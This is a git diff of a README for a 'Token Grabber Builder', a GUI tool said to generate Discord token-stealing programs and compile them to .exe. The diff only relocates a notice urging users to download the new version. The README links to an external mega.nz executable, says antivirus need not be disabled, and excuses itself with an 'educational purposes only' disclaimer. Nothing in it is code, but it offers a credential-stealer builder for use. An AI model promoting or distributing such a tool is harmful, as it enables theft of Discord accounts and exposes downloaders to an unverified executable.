@@ -1,5 +1,7 @@
 # Token Grabber Builder
 a GUI demonstrating how Discord token grabbers in .py can be created and converted to .exe format.
+# IMPORTANT
+YOU HAVE TO DOWNLOAD ALL ( OLD VERSION WITH NEW VERSION ) AND DELETE THE TOKEN GRABBER BUILDER.EXE ( OLD VERSION ) THEN USE THE NEW VERSION SO THAT'S THE FILE CAN WORKING
 # About :
 This tool should only be used for educational purposes only. Do not use this on others maliciously. This program demonstrates, in an easy GUI format, how token grabbers can be created and compiled to exe from a .py file. When this tool is used, it makes it easier to understand the process and methods of how the output .exe file searches for Discord tokens and the type of information it extracts from a user.
 
@@ -21,5 +23,4 @@ Developer note : No need to turn off anti virus or fire wall.
 # Note
 The new file just >25 mb so i can't upload it on github so here you can download new version here ( working )
 [file .exe new version](https://mega.nz/file/FhNXnTLT#GA50Nig0K28PHhOiiIPy0fnoDvPY3LRVersZTiyHqes)
-# IMPORTANT
-YOU HAVE TO DOWNLOAD ALL ( OLD VERSION WITH NEW VERSION ) AND DELETE THE TOKEN GRABBER BUILDER.EXE ( OLD VERSION ) THEN USE THE NEW VERSION SO THAT'S THE FILE CAN WORKING
+
